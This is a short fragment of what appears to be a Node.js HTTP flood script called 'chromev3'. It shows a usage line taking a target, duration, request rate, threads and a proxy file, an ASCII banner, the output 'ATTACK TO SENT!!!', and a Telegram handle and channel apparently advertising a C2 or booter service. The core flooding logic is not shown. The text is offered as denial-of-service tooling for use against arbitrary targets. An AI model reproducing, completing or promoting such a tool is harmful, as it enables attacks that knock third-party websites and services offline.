...
node chromev3 [target] [duration] [request per_second] [threads] [proxyfile]`));; process.exit();}
 const headers = {};
...
╚██████╗██║  ██║██║  ██║╚██████╔╝██║ ╚═╝ ██║███████╗     ╚████╔╝      ██║
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝      ╚═══╝       ╚═╝
                                                                         `)
      console.log(gradient.vice(`ATTACK TO SENT!!!`))
      console.log(`Telegram Me : @SkyzXz`)
      console.log(`Channel : https://t.me/TrepxC2`)
